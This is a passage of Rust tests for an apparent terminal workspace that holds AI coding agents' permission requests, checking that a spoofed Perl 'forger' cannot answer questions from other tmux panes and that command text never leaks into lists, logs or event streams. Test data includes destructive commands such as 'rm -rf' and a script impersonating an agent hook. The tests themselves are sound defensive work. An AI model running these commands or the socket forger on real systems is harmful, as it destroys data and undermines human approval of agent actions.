    /// once tmux's client is attached — this test binary again, reading the
    /// request — and then nothing, until the server is killed.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn tmux_pane_runs_the_hook(root: &TempDir) {
        let input = root.0.join("input.json");
        fs::write(
            &input,
            json!({
                "session_id": "4f1c2b7e-0d3a-4e5f-9a8b-7c6d5e4f3a2b",
                "cwd": "/home/someone/work/crook",
                "hook_event_name": "PermissionRequest",
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf build"},
            })
            .to_string(),
        )
        .expect("the input is written");
        let binary = std::env::current_exe().expect("the test binary has a path");
        fs::write(
            root.0.join("pane.sh"),
            format!(
                "until [ -n \"$(tmux list-clients)\" ]; do sleep 0.05; done\n\
                 STY= ZELLIJ= CLAUDE_CODE_ENTRYPOINT=cli {CHILD_ASKS}=1 '{binary}' --exact \
                 control::tests::socket::asks_as_a_hook_below_a_panes_shell --ignored \
                 --test-threads=1 -q < '{input}'\n\
                 exec sleep 600\n",
                binary = binary.display(),
                input = input.display(),
            ),
        )
        .expect("the pane's script is written");
    }

    /// A process that asks `asked` of the window at `socket` as a hook would,
    /// from a `perl` of its own, holding its connection until the window
    /// ends it; with `opening`, under a parent `perl` that holds that
    /// terminal open — a process anyone could start that has the pane's
    /// terminal and no tmux.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn forger(root: &TempDir, socket: &Path, asked: AgentAsk, opening: Option<&Path>) -> String {
        let line = root.0.join(format!("line-{}", asked.session));
        fs::write(&line, protocol::request_line(&Verb::AgentAsk(asked), None))
            .expect("the line is written");
        let script = root.0.join("forger.pl");
        fs::write(
            &script,
            "use IO::Socket::UNIX;\n\
             my ($socket, $line) = @ARGV;\n\
             open(my $read, '<', $line) or die \"$line: $!\";\n\
             my $sent = <$read>;\n\
             my $window = IO::Socket::UNIX->new(Type => SOCK_STREAM(), Peer => $socket) \
             or die \"connect: $!\";\n\
             print $window $sent;\n\
             $window->flush;\n\
             while (<$window>) {}\n",
        )
        .expect("the forger is written");
        let quoted = |path: &Path| format!("'{}'", path.display());
        let ask = format!(
            "perl {} {} {}",
            quoted(&script),
            quoted(socket),
            quoted(&line)
        );
        match opening {
            None => ask,
            Some(terminal) => format!(
                "perl -e 'open(my $t, \"+<\", $ARGV[0]) or die \"open: $!\"; \
                 exit(system(\"sh\", \"-c\", $ARGV[1]) >> 8)' {} \"{ask}\"",
                quoted(terminal)
            ),
        }
    }

    /// Runs `command` under `sh`, beside the test, and leaves it running.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn start(command: &str) -> std::process::Child {
        crate::process::command("sh")
            .args(["-c", command])
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .spawn()
            .expect("sh starts")
    }

    /// The window `root` serves with a pane that is a tmux client of `tmux`
    /// whose pane runs the hook, once the hook's question is held: the
    /// window, the pane, and the question.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn tmux_asking(
        root: TempDir,
        tmux: &TestTmux,
        other: &TestTmux,
        under_perl: bool,
    ) -> (Served, PaneId, super::super::ask::AskId) {
        tmux_pane_runs_the_hook(&root);
        let shell = tmux_shell(&root, tmux, other, under_perl);
        let mut served = Served::with(root, shell, |_, _, _| {});
        let pane = first_pane(&served);
        served.shell.open();
        served.pump_until("the hook inside tmux never asked", |served| {
            served.asks() == 1
        });
        let id = served.read(|workspace, _| {
            let ask = workspace
                .asks()
                .in_pane(pane)
                .expect("held in the tmux pane");
            assert!(ask.inside.is_some(), "not from inside tmux");
            ask.id
        });
        (served, pane, id)
    }

    /// Why the newest question held from `session` cannot be answered, if
    /// it cannot.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn cannot_answer_from(served: &Served, session: &str) -> Option<CannotAnswer> {
        served.read(|workspace, _| {
            workspace
                .asks()
                .live()
                .filter(|ask| ask.session == session)
                .max_by_key(|ask| ask.id)
                .expect("held")
                .cannot_answer
        })
    }

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    #[test]
    fn a_question_from_inside_tmux_is_answerable_only_from_under_the_tmux_in_its_pane() {
        if !TestTmux::here() {
            return;
        }
        let root = TempDir::runtime();
        let tmux = TestTmux {
            directory: root.0.clone(),
            name: "a",
        };
        let other = TestTmux {
            directory: root.0.clone(),
            name: "b",
        };
        let root_path = root.0.clone();
        let (mut served, pane, real) = tmux_asking(root, &tmux, &other, false);
        // The hook in tmux's pane, under the server holding the client's
        // terminal, which runs the tmux in the pane's foreground.
        assert_eq!(
            served.read(|workspace, _| workspace.asks().get(real).map(|ask| ask.cannot_answer)),
            Some(None),
            "the agent's own question inside tmux is answerable"
        );
        let tty = served.tty(pane);
        let terminal = PathBuf::from(
            fs::read_to_string(root_path.join("pane-tty"))
                .expect("the pane said its terminal")
                .trim(),
        );
        let socket = served.socket();
        let scratch = TempDir::new();
        let mut started = Vec::new();

        // A process outside tmux naming the client's terminal.
        let (_outside, reply) = served.ask_as(from_tmux("f1", vec![tty], "ls"), None);
        held(&reply);
        assert_eq!(
            cannot_answer_from(&served, "f1"),
            Some(CannotAnswer::NotFromItsTmux)
        );

        // One under a parent that opened the pane's terminal: it holds it,
        // and runs perl, not the tmux in the pane.
        started.push(start(&forger(
            &scratch,
            &socket,
            from_tmux("f2", vec![tty], "ls"),
            Some(&terminal),
        )));
        served.pump_until("the forger under perl never asked", |served| {
            served.asks() == 3
        });
        assert_eq!(
            cannot_answer_from(&served, "f2"),
            Some(CannotAnswer::NotFromItsTmux)
        );

        // One inside that tmux naming another tab's terminal, where another
        // tmux is attached: an ancestor runs tmux, and holds only this
        // tab's terminal.
        served.update(|workspace, ctx| workspace.apply(TabAction::New, ctx));
        let second = served.read(|workspace, _| {
            workspace
                .tabs()
                .panes()
                .map(|(_, open)| open.id())
                .find(|open| *open != pane)
                .expect("a second pane")
        });
        served.pump_until("the second tab never started tmux", |_| {
            !other.run(&["list-clients"]).trim().is_empty()
        });
        let script = forger(
            &scratch,
            &socket,
            from_tmux("f3", vec![served.tty(second)], "ls"),
            None,
        );
        tmux.run(&["new-window", &script]);
        served.pump_until("the forger inside tmux never asked", |served| {
            served.asks() == 4
        });
        assert_eq!(
            cannot_answer_from(&served, "f3"),
            Some(CannotAnswer::NotFromItsTmux)
        );

        // And none of them stands in front of the agent's own.
        assert_eq!(
            served.read(|workspace, _| workspace.asks().in_pane(pane).map(|ask| ask.id)),
            Some(real)
        );
        served.update(|workspace, _| workspace.asks_mut().end_all(Cause::TurnEnded));
        for mut child in started {
            let _ = child.wait();
        }
    }

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    #[test]
    fn a_question_from_a_tmux_that_is_not_the_panes_foreground_is_read_only() {
        // tmux run as a child of the program in the pane's foreground: the
        // server holds the terminal, and runs another program than the
        // pane's.
        if !TestTmux::here() {
            return;
        }
        let root = TempDir::runtime();
        let tmux = TestTmux {
            directory: root.0.clone(),
            name: "a",
        };
        let other = TestTmux {
            directory: root.0.clone(),
            name: "b",
        };
        let (mut served, _, real) = tmux_asking(root, &tmux, &other, true);
        assert_eq!(
            served.read(|workspace, _| workspace.asks().get(real).map(|ask| ask.cannot_answer)),
            Some(Some(CannotAnswer::NotFromItsTmux))
        );
        served.update(|workspace, _| workspace.asks_mut().end_all(Cause::TurnEnded));
    }

    #[test]
    fn neither_pane_list_events_nor_the_session_file_carry_the_command() {
        const MARKER: &str = "crook-marker-7f3a9c";
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let token = served.token(pane);
        let following = served.start(follow(Some(&token), Some(pane)));
        served.pump_until("the stream never began", |served| served.following() == 1);

        let (_client, reply) = served.ask_as(
            question("s1", served.tty(pane), &format!("echo {MARKER}")),
            Some(token.clone()),
        );
        held(&reply);
        let listed = served.ask(|socket| cli::unix::listing(&socket, None, true, None));
        let listed = listed.expect("listed");
        assert!(!listed.contains(MARKER), "{listed}");
        served.report(
            pane,
            AgentStatus::NeedsInput,
            Some("permission to use Bash"),
        );
        served.read(|workspace, _| {
            let ask = workspace.asks().in_pane(pane).expect("held");
            assert!(ask.summary.contains(MARKER), "the row may say it");
            let logged =
                super::super::ask::log_line(ask, How::Ended(Cause::PaneClosed), Instant::now());
            assert!(!logged.contains(MARKER), "{logged}");
            assert!(logged.contains(&ask.fingerprint[..12]), "{logged}");
        });

        let listed = served.ask(|socket| cli::unix::listing(&socket, None, true, None));
        let listed = listed.expect("listed");
        assert!(!listed.contains(MARKER), "{listed}");
        let session = served.read(|workspace, _| {
            serde_json::to_string(&crate::session::Session::of(workspace.tabs(), None))
                .expect("a session encodes")
        });
        assert!(!session.contains(MARKER), "{session}");

        // The stream ends with the pane, and has said nothing of the command.
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(pane), ctx);
        });
        let events = served.finish(following).expect("followed");
        let said = format!("{events:?}");
        assert!(!said.contains(MARKER), "{said}");
        assert!(
            events
                .iter()
                .any(|event| matches!(event, PaneEvent::Status { .. })),
            "the stream did hear the pane: {said}"
        );
    }

    impl Served {
        /// Holds a question about `command` from `session` in `pane` as one
        /// this window could answer — as a hook below the pane's shell would
        /// have it held, without the shell — and hands back its number and
        /// its digest.
        fn hold_answerable(
            &mut self,
            pane: PaneId,
            session: &str,
            command: &str,
        ) -> (super::super::ask::AskId, [u8; 32]) {
            self.hold_found(pane, session, command, None)
        }

        /// The same, with `cannot_answer` as the window found it.
        fn hold_found(
            &mut self,
            pane: PaneId,
            session: &str,
            command: &str,
            cannot_answer: Option<super::super::ask::CannotAnswer>,
        ) -> (super::super::ask::AskId, [u8; 32]) {
            let asked = question(session, 0, command);
            let digest = asked.digest();
            let feed = Arc::new(Feed::for_verb(&Verb::AgentAsk(asked.clone())));
            let id = self.update(move |workspace, ctx| {
                let id = workspace
                    .asks_mut()
                    .add(
                        asked,
                        super::super::ask::Found {
                            pane,
                            cannot_answer,
                            tab_title: "worker".to_owned(),
                            inside: None,
                        },
                        feed,
                        Instant::now(),
                    )
                    .expect("held");
                workspace.asks_changed(ctx);
                id
            });
            (id, digest)
        }
    }

    /// The `asked` and `answered` lines of a stream, in order.
    fn asking_events(events: &[PaneEvent]) -> Vec<PaneEvent> {
        events
            .iter()
            .filter(|event| matches!(event, PaneEvent::Asked { .. } | PaneEvent::Answered { .. }))
            .cloned()
            .collect()
    }

    #[test]
    fn pane_list_wait_and_events_keep_reading_the_stored_status() {
        // The row turns amber the moment the hook asks; what the socket
        // says is what the agent said, as it was before.
        const MARKER: &str = "crook-marker-e27b90";
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        served.report(worker, AgentStatus::Running, None);
        let following = served.start(follow(Some(&token), None));
        served.pump_until("the stream never began", |served| served.following() == 1);
        let waiting = served.start(wait(&token, worker, Until::NeedsInput, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });

        served.hold_answerable(worker, "s1", &format!("rm -rf {MARKER}"));
        assert_eq!(
            served.read(|workspace, _| workspace.tabs().pane(worker).map(|pane| pane.status())),
            Some(AgentStatus::NeedsInput),
            "the row is amber"
        );
        assert_eq!(served.waiting(), 1, "the wait was answered by the row");
        let listed = served.read(panes);
        let entry = listed
            .iter()
            .find(|entry| entry.pane_id == opened.pane_id)
            .expect("the worker is listed");
        assert_eq!(entry.status, "running");
        assert_eq!(entry.message, None);
        assert!(entry.asking);

        served.report(
            worker,
            AgentStatus::NeedsInput,
            Some("Claude needs your permission"),
        );
        let printed = served.finish(waiting).expect("answered");
        assert_eq!(printed.text, "needs-input: Claude needs your permission");
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(lead), ctx);
        });
        let events = served
            .finish(following)
            .expect("followed until the lead closed");
        let statuses: Vec<&PaneEvent> = events
            .iter()
            .filter(|event| matches!(event, PaneEvent::Status { pane_id, .. } if *pane_id == opened.pane_id))
            .collect();
        assert_eq!(
            statuses,
            vec![&PaneEvent::Status {
                pane_id: opened.pane_id,
                status: "needs-input".to_owned(),
                message: Some("Claude needs your permission".to_owned()),
            }],
            "{events:#?}"
        );
        let said = format!("{events:?}");
        assert!(!said.contains(MARKER), "{said}");
    }

    #[test]
    fn a_lead_following_its_worker_is_told_it_asks_and_how_it_was_answered_and_never_the_command() {
        use super::super::protocol::{AnsweredBy, Decision};
        use crate::workspace::{AskAction, Pressed};

        const MARKER: &str = "crook-marker-5b8e1d";
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["make", "test"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let following = served.start(follow(Some(&token), None));
        served.pump_until("the stream never began", |served| served.following() == 1);

        // Answered on its card, Allow.
        let (first, digest) = served.hold_answerable(worker, "s1", &format!("echo {MARKER}"));
        served.update(|workspace, ctx| {
            workspace.answer_waiting_agent(ctx);
            workspace.settle_the_ask_card(ctx);
            workspace.read_the_ask_card_to_its_end();
            workspace.handle_action(
                &AskAction::Answer {
                    ask: first,
                    digest,
                    decision: Choice::Allow,
                    by: Pressed::Pointer,
                }
                .into(),
                ctx,
            );
        });
        assert_eq!(
            served.ended(first.as_u64()),
            Some(How::Answered(Choice::Allow))
        );
        let untold = |served: &Served| served.read(|workspace, _| workspace.asks().untold());
        assert_eq!(untold(&served), 0, "told within the turn that answered it");

        // Withdrawn, when the agent's turn ends under it.
        served.hold_answerable(worker, "s2", &format!("cat /home/someone/{MARKER}"));
        served.report(worker, AgentStatus::Idle, None);
        assert_eq!(untold(&served), 0, "told within the turn that ended it");

        // One this window can only show is no news to a lead.
        served.hold_found(
            worker,
            "s3",
            &format!("echo {MARKER}"),
            Some(super::super::ask::CannotAnswer::NotFromThisTab),
        );

        // Closed, with its pane, and told before the pane is.
        let (_, digest) = served.hold_answerable(worker, "s4", &format!("rm -rf {MARKER}"));
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(lead), ctx);
        });

        let events = served
            .finish(following)
            .expect("followed until the lead closed");
        let pane_id = opened.pane_id;
        let asked = PaneEvent::Asked {
            pane_id,
            agent: "claude".to_owned(),
            tool: "Bash".to_owned(),
        };
        let answered = |by, decision| PaneEvent::Answered {
            pane_id,
            by,
            decision,
        };
        assert_eq!(
            asking_events(&events),
            vec![
                asked.clone(),
                answered(AnsweredBy::Here, Some(Decision::Allow)),
                asked.clone(),
                answered(AnsweredBy::Withdrawn, None),
                asked,
                answered(AnsweredBy::Closed, None),
            ],
            "{events:#?}"
        );
        let closed_at = events
            .iter()
            .position(|event| *event == PaneEvent::Closed { pane_id })
            .expect("the worker is told closed");
        let answered_at = events
            .iter()
            .position(|event| *event == answered(AnsweredBy::Closed, None))
            .expect("its question is told over");
        assert!(answered_at < closed_at, "{events:#?}");

        // Never the command, its directory, its digest or its fingerprint,
        // and never more than the three fields and the event's name.
        let said = events
            .iter()
            .map(|event| serde_json::to_string(event).expect("encodes"))
            .collect::<Vec<_>>()
            .join("\n");
        let fingerprint = crate::agent::request::fingerprint(&digest);
        for secret in [
            MARKER,
            "/home/someone/work/crook",
            &fingerprint[..12],
            "Remove the build directory",
        ] {
            assert!(!said.contains(secret), "{secret:?} in {said}");
        }
        for event in asking_events(&events) {
            let encoded = serde_json::to_value(&event).expect("encodes");
            let mut keys: Vec<&str> = encoded
                .as_object()
                .expect("an object")
                .keys()
                .map(String::as_str)
                .collect();
            keys.sort_unstable();
            assert!(
                keys == ["agent", "event", "pane_id", "tool"]
                    || keys == ["by", "event", "pane_id"]
                    || keys == ["by", "decision", "event", "pane_id"],
                "{keys:?}"
            );
        }
    }

    #[test]
    fn a_pane_the_caller_may_not_watch_tells_it_nothing() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (lead, person) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("a pane"), panes.next().expect("two"))
        });
        let token = served.token(lead);
        let refused = served
            .ask(follow(Some(&token), Some(person)))
            .expect_err("a person's pane is theirs to open up");
        assert!(refused.contains("needs-grant"), "{refused}");

        let following = served.start(follow(Some(&token), None));
        served.pump_until("the stream never began", |served| served.following() == 1);
        let (id, _) = served.hold_answerable(person, "s1", "echo hello");
        served.update(|workspace, ctx| {
            workspace.asks_mut().end(id, Cause::Expired);
            workspace.asks_changed(ctx);
        });
        served.hold_answerable(person, "s2", "echo again");
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(person), ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(lead), ctx);
        });

        let events = served
            .finish(following)
            .expect("followed until the lead closed");
        let person_id = person.as_u64();
        assert!(
            !events.iter().any(|event| matches!(
                event,
                PaneEvent::Asked { pane_id, .. } | PaneEvent::Answered { pane_id, .. }
                    if *pane_id == person_id
            )),
            "{events:#?}"
        );
        assert_eq!(asking_events(&events), vec![], "{events:#?}");
        assert!(
            events.iter().any(|event| *event
                == PaneEvent::Closed {
                    pane_id: lead.as_u64()
                }),
            "the stream did run to the end: {events:#?}"
        );
    }

    #[test]
    fn a_question_refused_as_busy_still_tells_the_leads_what_it_ended_on_the_way() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let token = served.token(pane);
        // A question whose hook gave up without the window hearing, which
        // the next question held ends as its hook having gone.
        let abandoned = question("gone", 0, "echo gone");
        let feed = Arc::new(Feed::for_verb(&Verb::AgentAsk(abandoned.clone())));
        let held_feed = Arc::clone(&feed);
        let id = served.update(move |workspace, ctx| {
            let id = workspace
                .asks_mut()
                .add(
                    abandoned,
                    super::super::ask::Found {
                        pane,
                        cannot_answer: None,
                        tab_title: "worker".to_owned(),
                        inside: None,
                    },
                    held_feed,
                    Instant::now(),
                )
                .expect("held");
            workspace.asks_changed(ctx);
            id
        });
        // The pane is full of the questions a hook asking from here is
        // counted among, so the next is refused.
        for session in ["r1", "r2", "r3", "r4"] {
            served.hold_found(
                pane,
                session,
                "ls",
                Some(super::super::ask::CannotAnswer::NotFromThisTab),
            );
        }
        let following = served.start(follow(Some(&token), Some(pane)));
        served.pump_until("the stream never began", |served| served.following() == 1);
        feed.hang_up();

        let (_client, reply) =
            served.ask_as(question("r5", served.tty(pane), "ls"), Some(token.clone()));
        assert_eq!(refused(&reply), code::BUSY);
        assert_eq!(served.ended(id.as_u64()), Some(How::Ended(Cause::HookGone)));
        assert_eq!(
            served.read(|workspace, _| workspace.asks().untold()),
            0,
            "told within the turn that refused"
        );

        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(pane), ctx);
        });
        let events = served.finish(following).expect("followed until it closed");
        let withdrawn = PaneEvent::Answered {
            pane_id: pane.as_u64(),
            by: super::super::protocol::AnsweredBy::Withdrawn,
            decision: None,
        };
        assert_eq!(
            asking_events(&events).first(),
            Some(&withdrawn),
            "{events:#?}"
        );
    }

    #[test]
    fn pane_list_says_asking_and_nothing_more() {
        const MARKER: &str = "crook-marker-0c4d2a";
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (asking, other) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("a pane"), panes.next().expect("two"))
        });
        let listed = |served: &mut Served| -> Vec<Value> {
            let json = served
                .ask(|socket| cli::unix::listing(&socket, None, true, None))
                .expect("listed");
            assert!(!json.contains(MARKER), "{json}");
            serde_json::from_str(&json).expect("a JSON array")
        };
        let entry = |list: &[Value], pane: PaneId| -> Value {
            list.iter()
                .find(|entry| entry["pane_id"] == pane.as_u64())
                .cloned()
                .expect("listed")
        };
        let keys = |entry: &Value| -> Vec<String> {
            let mut keys: Vec<String> = entry
                .as_object()
                .expect("an object")
                .keys()
                .cloned()
                .collect();
            keys.sort_unstable();
            keys
        };

        let before = listed(&mut served);
        let quiet = keys(&entry(&before, asking));
        assert!(!quiet.contains(&"asking".to_owned()), "{quiet:?}");

        let (id, _) = served.hold_answerable(asking, "s1", &format!("echo {MARKER}"));
        // A question this window can only show is not one its pane asks.
        served.hold_found(
            other,
            "s2",
            &format!("echo {MARKER}"),
            Some(super::super::ask::CannotAnswer::OtherTab),
        );
        let during = listed(&mut served);
        let held = entry(&during, asking);
        assert_eq!(held["asking"], true, "{held}");
        let mut expected = quiet.clone();
        expected.push("asking".to_owned());
        expected.sort_unstable();
        assert_eq!(keys(&held), expected, "asking, and nothing more: {held}");
        assert!(
            !keys(&entry(&during, other)).contains(&"asking".to_owned()),
            "{during:?}"
        );

        served.update(|workspace, ctx| {
            workspace.asks_mut().end(id, Cause::Expired);
            workspace.asks_changed(ctx);
        });
        let after = listed(&mut served);
        assert_eq!(keys(&entry(&after, asking)), quiet, "{after:?}");
    }
}
